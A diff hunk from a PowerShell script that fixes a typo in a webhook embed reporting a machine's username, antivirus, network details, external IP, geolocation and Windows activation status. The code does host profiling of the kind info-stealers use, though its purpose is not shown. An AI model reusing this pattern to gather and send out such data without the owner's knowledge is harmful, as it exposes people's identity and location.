@@ -723,7 +723,7 @@ function webhooks {
                 @{ name = ""; value = ":calendar: $date`n"; inline = $false },
                 @{ name = ":computer: **SYSTEM**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
                 @{ name = ":desktop: **HARDWARE**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n$diskall`n"; inline = $false },
-                @{ name = ":globe_with_meridians: **NETWORK**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)"; inline = $false },
+                @{ name = ":globe_with_meridians: **NETWORK**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)"; inline = $false },
                 @{ name = ""; value = "-----------------------------------------------"; inline = $false },
                 @{ name = "**:green_circle: ACTIVATION STATUS**"; value = "   // Windows Activation Status //`n`n$ActivationStatus`n$(CheckOhook)"; inline = $false }
                 
